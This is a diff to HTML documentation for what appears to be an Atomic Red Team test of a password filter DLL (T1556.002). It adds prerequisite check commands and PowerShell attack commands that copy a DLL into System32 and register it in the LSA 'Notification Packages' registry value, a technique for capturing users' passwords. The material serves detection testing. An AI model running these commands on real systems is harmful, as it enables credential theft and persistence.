@@ -454,6 +454,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-atomicpasswordfilter-dll-must-exist-on-disk-at-specified-location-input-dll">
+         Description: AtomicPasswordFilter.dll must exist on disk at specified location (#{input_dll})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -500,10 +528,36 @@
 <div class="section" id="atomic-test-1-install-and-register-password-filter-dll">
 <h3>Atomic Test #1 - Install and Register Password Filter DLL<a class="headerlink" href="#atomic-test-1-install-and-register-password-filter-dll" title="Permalink to this headline">¶</a></h3>
 <p>Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-atomicpasswordfilter-dll-must-exist-on-disk-at-specified-location-input-dll">
+<h5>Description: AtomicPasswordFilter.dll must exist on disk at specified location (#{input_dll})<a class="headerlink" href="#description-atomicpasswordfilter-dll-must-exist-on-disk-at-specified-location-input-dll" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1556</span><span class="p">.</span><span class="n">002</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">AtomicPasswordFilter</span><span class="p">.</span><span class="n">dll</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Write-Host</span> <span class="s2">&quot;You must provide your own password filter dll&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1556</span><span class="o">.</span><span class="mi">002</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$passwordFilterName</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Copy-Item</span> <span class="s2">&quot;#{input_dll}&quot;</span> <span class="n">-Destination</span> <span class="s2">&quot;C:\Windows\System32&quot;</span> <span class="n">-PassThru</span><span class="p">).</span><span class="n">basename</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$passwordFilterName</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Copy-Item</span> <span class="s2">&quot;PathToAtomicsFolder\T1556.002\src\AtomicPasswordFilter.dll&quot;</span> <span class="n">-Destination</span> <span class="s2">&quot;C:\Windows\System32&quot;</span> <span class="n">-PassThru</span><span class="p">).</span><span class="n">basename</span>
 <span class="nv">$lsaKey</span> <span class="p">=</span> <span class="nb">Get-Item</span> <span class="s2">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\&quot;</span>
 <span class="nv">$notificationPackagesValues</span> <span class="p">=</span> <span class="nv">$lsaKey</span><span class="p">.</span><span class="n">GetValue</span><span class="p">(</span><span class="s2">&quot;Notification Packages&quot;</span><span class="p">)</span>
 <span class="nv">$notificationPackagesValues</span> <span class="p">+=</span> <span class="nv">$passwordFilterName</span>
